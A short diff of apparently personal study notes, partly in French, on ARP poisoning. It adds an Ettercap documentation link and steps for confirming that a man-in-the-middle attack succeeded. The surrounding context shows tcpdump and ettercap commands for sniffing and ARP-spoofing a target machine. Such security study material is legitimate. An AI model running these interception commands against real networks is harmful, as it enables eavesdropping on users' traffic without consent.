@@ -478,7 +478,7 @@ tcpdump -i eth0 -n port 80 and host *addripquonveutecouter* #on ecoute le port 8
 ARP poisoning is an attack that is accomplished using the technique of ARP spoofing. 
 ARP protocol :  protocole utilisé pour traduire une adresse de protocole de couche réseau (adresse IPv4) en une adresse de protocole de couche de liaison (adresse MAC). 
 
-Ettercap
+[Ettercap doc reference](https://www.irongeek.com/i.php?page=backtrack-3-man/ettercap)
 ````
 sudo ettercap -T -S -i eth0 -M arp:remote /*addrrouteur*// /*addrmachinecible*//
 *addrrouteur* = target1
@@ -488,6 +488,8 @@ off le sniffing at startup, valider
 loupe pour voir qui est sur mon reseau, puis emoticone a droite de la loupe pr guetter mes targets
 selectionner les targets
 lancer mitm attack
+=> checker si changement de MAC pour le routeur a marche sur la machine cible : arp -a
+=> pinger le routeur, normalement prend plus de temps qu'un ping classique
 ````
 
 #### Malware Threats, Denial-of-Service, Session Hijacking, SQL injection ..
